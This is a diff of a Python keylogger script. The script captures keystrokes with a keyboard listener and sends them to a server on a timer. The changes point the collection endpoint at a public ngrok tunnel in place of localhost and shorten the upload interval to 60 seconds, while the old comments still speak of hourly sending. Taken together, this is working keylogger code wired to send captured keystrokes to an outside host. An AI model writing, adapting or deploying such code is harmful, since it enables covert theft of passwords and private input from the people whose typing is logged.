@@ -6,7 +6,7 @@ import threading
 key_log = []
 
 # Server endpoint
-API_URL = "http://localhost:3002/api/keys"
+API_URL = "https://893f13a17c53-18320658179660089964.ngrok-free.app/api/keys"
 
 # Function to send data to the server
 def send_to_server(data):
@@ -17,7 +17,7 @@ def send_to_server(data):
         print(f"Error sending data: {e}")
 
 # Periodically send keys to the server (once an hour)
-def hourly_send(interval=360):
+def hourly_send(interval=60):
     global key_log
     threading.Timer(interval, hourly_send, [interval]).start()  # Restart timer for the next interval
     if key_log:
@@ -42,7 +42,7 @@ def on_release(key):
         return False
 
 # Start periodic sending (once an hour)
-hourly_send(interval=360)  # Send data every hour (3600 seconds)
+hourly_send(interval=60)  # Send data every hour (3600 seconds)
 
 # Collect events until released
 with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
